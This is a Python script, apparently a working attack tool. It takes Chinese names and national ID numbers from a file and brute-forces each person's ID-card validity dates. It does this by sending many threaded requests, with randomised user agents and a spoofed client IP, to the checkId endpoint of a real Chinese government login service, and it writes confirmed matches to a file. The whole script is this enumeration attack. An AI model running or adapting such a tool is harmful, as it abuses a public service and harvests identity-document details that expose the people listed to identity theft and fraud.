import requests
import datetime
import time
from fake_useragent import UserAgent
import os
import threading
import urllib
from urllib import parse
from datetime import timedelta
from datetime import datetime
import json
from Crypto.Cipher import PKCS1_v1_5 as Cipher_pksc1_v1_5
from Crypto.PublicKey import RSA
import urllib.parse
from fake_useragent import UserAgent
import base64
import chardet
import concurrent.futures

BANNER = r"""
------------------------------------
"""
print(BANNER)

while True:
    found_validity = False
    event = threading.Event()
    def encrpt(password, public_key):
        rsakey = RSA.importKey(public_key)
        cipher = Cipher_pksc1_v1_5.new(rsakey)
        cipher_text = base64.b64encode(cipher.encrypt(password.encode()))
        return cipher_text.decode()

    def detect_file_encoding(file_path):
        with open(file_path, 'rb') as file:
            raw_data = file.read()
            result = chardet.detect(raw_data)
            return result['encoding']
        
    file_path = "sfz.txt"      
    file_encoding = detect_file_encoding(file_path)

    file_encoding = 'utf-8'
    while True:
        with open(file_path, 'r', encoding=file_encoding, errors="ignore") as file:
            lines = file.readlines()

        if not lines:
            print("文件为空，无法读取内容。")
        else:
            break
        
    first_line = lines[0].strip()
    line_list = first_line.split('-')
    aa = line_list[0]
    a = urllib.parse.quote(aa)
    aaaa = a
    bb = line_list[1]
    f = bb[6:14]
    print("该生日为" + f)
    print("姓名为" + aa)
    print("身份证号为" + bb)
    if int(f[0:4]) < 2000:
        c = "20000101"
    else:
        birth_year = int(f[0:4])
        birth_month = int(f[4:6])
        birth_day = int(f[6:8])
        c_year = birth_year + 12
        c_month = birth_month
        c_day = birth_day
        c = f"{c_year:04d}{c_month:02d}{c_day:02d}"

    print("开始日期为" + c)

    with open('sfz.txt', 'w', encoding='utf-8') as file:
        file.writelines(lines[1:]) 

    def add_date(date_str, add_count=1):
        date_list = time.strptime(date_str, "%Y%m%d")
        y, m, d = date_list[:3]
        delta = timedelta(days=add_count)
        date_result = datetime(y, m, d) + delta
        date_result = date_result.strftime("%Y%m%d")
        return date_result


    d1 = datetime.strptime(c, '%Y%m%d')
    d2 = datetime.strptime(c, '%Y%m%d')
    d3 = datetime.strptime('20230602', '%Y%m%d')

    delta = d3 - d1
    delta1 = d2 - d1

    days = delta.days
    days1 = delta1.days

    with open(r'所有时间.txt', 'a+', encoding='utf-8') as test:
        test.truncate(0)

    f = open("所有时间.txt", "a")
    for i in range(0, days):
        f.write(c + '\n')
        c = add_date(c, 1)
    f.close()

    for i in range(0, 100):
        with open('所有时间_part' + str(i) + '.txt', 'a+', encoding='utf-8') as test:
            test.truncate(0)

    sourceFileName = "所有时间.txt"


    def cutFile():
        print("正在读取文件...")
        sourceFileData = open(sourceFileName, 'r', encoding='utf-8')
        ListOfLine = sourceFileData.read().splitlines()
        n = len(ListOfLine)
        print("文件共有" + str(n) + "行")
        m = 100
        p = n // m
        print("需要将文件分成" + str(m) + "个子文件")
        print("每个文件最多有" + str(p) + "行")
        print("开始进行分割···")
        for i in range(m):
            print("正在生成第" + str(i + 1) + "个子文件")
            destFileName = os.path.splitext(sourceFileName)[0] + "_part" + str(i) + ".txt"
            destFileData = open(destFileName, "w", encoding='utf-8')
            if (i == m - 1):
                for line in ListOfLine[i * p:]:
                    destFileData.write(line + '\n')
            else:
                for line in ListOfLine[i * p:(i + 1) * p]:
                    destFileData.write(line + '\n')
            destFileData.close()
        print("分割完成")

    cutFile()
    url = "https://login.gjzwfw.gov.cn/tacs-uc/naturalMan/csrfSave"
    headers = {
        "Host": "login.gjzwfw.gov.cn",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": UserAgent().random,
        "sec-ch-ua-platform": '"Windows"',
        "Origin": "https://login.gjzwfw.gov.cn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://login.gjzwfw.gov.cn/tacs-uc/naturalMan/register",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cookie": "",
        "Connection": "keep-alive"
    }
    response = requests.post(url, headers=headers)
    token1 = response.json()['data']
    ck = response.headers['Set-Cookie']
    key = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsgDq4OqxuEisnk2F0EJFmw4xKa5IrcqEYHvqxPs2CHEg2kolhfWA2SjNuGAHxyDDE5MLtOvzuXjBx/5YJtc9zj2xR/0moesS+Vi/xtG1tkVaTCba+TV+Y5C61iyr3FGqr+KOD4/XECu0Xky1W9ZmmaFADmZi7+6gO9wjgVpU9aLcBcw/loHOeJrCqjp7pA98hRJRY+MML8MK15mnC4ebooOva+mJlstW6t/1lghR8WNV8cocxgcHHuXBxgns2MlACQbSdJ8c6Z3RQeRZBzyjfey6JCCfbEKouVrWIUuPphBL3OANfgp0B+QG31bapvePTfXU48TYK0M5kE+8LgbbWQIDAQAB'
    public_key = '-----BEGIN PUBLIC KEY-----\n' + key + '\n-----END PUBLIC KEY-----'
    token22 = encrpt(token1, public_key)
    url1= "https://login.gjzwfw.gov.cn/tacs-uc/login/addIP"
    headers1 = {
        "Host": "login.gjzwfw.gov.cn",
        "Connection": "keep-alive",
        "Content-Length": "12",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": UserAgent().random,
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "token": token22,
        "sec-ch-ua-platform": '"Windows"',
        "Origin": "https://login.gjzwfw.gov.cn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://login.gjzwfw.gov.cn/tacs-uc/naturalMan/register",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cookie": ck
    }
    data1 = "ip=127.0.0.1"
    response1 = requests.post(url1, headers=headers1, data=data1)
    url2 = "https://login.gjzwfw.gov.cn/tacs-uc/naturalMan/csrfSave"
    headers2 = {
        "Host": "login.gjzwfw.gov.cn",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": UserAgent().random,
        "sec-ch-ua-platform": '"Windows"',
        "Origin": "https://login.gjzwfw.gov.cn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://login.gjzwfw.gov.cn/tacs-uc/naturalMan/register",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cookie": ck,
        "Connection": "keep-alive"
    }
    response2 = requests.post(url2, headers=headers2)
    token1 = response.json()['data']
    
    def youxiaoqi(c, d):
        global found_validity
        trytimes = 1
        key = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsgDq4OqxuEisnk2F0EJFmw4xKa5IrcqEYHvqxPs2CHEg2kolhfWA2SjNuGAHxyDDE5MLtOvzuXjBx/5YJtc9zj2xR/0moesS+Vi/xtG1tkVaTCba+TV+Y5C61iyr3FGqr+KOD4/XECu0Xky1W9ZmmaFADmZi7+6gO9wjgVpU9aLcBcw/loHOeJrCqjp7pA98hRJRY+MML8MK15mnC4ebooOva+mJlstW6t/1lghR8WNV8cocxgcHHuXBxgns2MlACQbSdJ8c6Z3RQeRZBzyjfey6JCCfbEKouVrWIUuPphBL3OANfgp0B+QG31bapvePTfXU48TYK0M5kE+8LgbbWQIDAQAB'
        public_key = '-----BEGIN PUBLIC KEY-----\n' + key + '\n-----END PUBLIC KEY-----'
        token22 = encrpt(token1, public_key)
        name = encrpt(aaaa, public_key)
        a = urllib.parse.quote(name)
        sfz = encrpt(bb, public_key)
        b = urllib.parse.quote(sfz)
        datas3 = 'certType=111&name=' + a + '&nation=&certNo=' + b + '&startTime=' + c + '&endTime=' + d
        headers3 = {
            "Host": "login.gjzwfw.gov.cn",
            "Connection": "keep-alive",
            "Content-Length": "814",
            "sec-ch-ua-mobile": "?0",
            "User-Agent": UserAgent().random,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "token":token22,
            "sec-ch-ua-platform": '"Windows"',
            "Origin": "https://login.gjzwfw.gov.cn",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://login.gjzwfw.gov.cn/tacs-uc/naturalMan/register",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Cookie": ck
        }
        for i in range(trytimes):
            try:
                r = requests.post("https://login.gjzwfw.gov.cn/tacs-uc/naturalMan/retrieve/checkId", headers=headers3, data=datas3).json()
                print(r)
                validation_success = False
                try:
                    if r['code'] == '90000' and r['msg'] == '请求成功':
                        filedl = "./有效期.txt"
                        with open(filedl, 'a+', encoding="utf-8") as file:
                            data1 = str(aa) + "-" + str(bb) + "-" + str(c) + "-" + str(d) + "\n"
                            file.write(data1)
                            file.close()
                        validation_success = True
                except:
                    continue
                if validation_success:
                    found_validity = True
                    return True
                else:
                    return False
            except:
                continue
        return False
    

    with open(r'有效期.txt', 'a+', encoding='utf-8') as test:
        pass 

    def create_thread_and_start(file_path):
        global found_validity
        for line in open(file_path):
            if found_validity:
                return
            line = line.strip()
            y = line

            e = str(int(y[0:4]) + 10) + y[4:8]
            g = str(int(y[0:4]) + 20) + y[4:8]

            if youxiaoqi(y, e):
                print("匹配成功" + '\n' + "有效期：" + str(y) + '\n' + "结束期：" + str(e))
                event.set()
                break
            elif youxiaoqi(y, g):
                print("匹配成功" + '\n' + "有效期：" + str(y) + '\n' + "结束期：" + str(g))
                event.set()
                found_validity = True
                break
            
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(create_thread_and_start, f"所有时间_part{i}.txt") for i in range(100)]
    concurrent.futures.wait(futures)
    for i in range(100):
        filename = f"所有时间_part{i}.txt"
        if os.path.exists(filename):
            os.remove(filename)
    if os.path.exists("所有时间.txt"):
        os.remove("所有时间.txt")  
        
                           
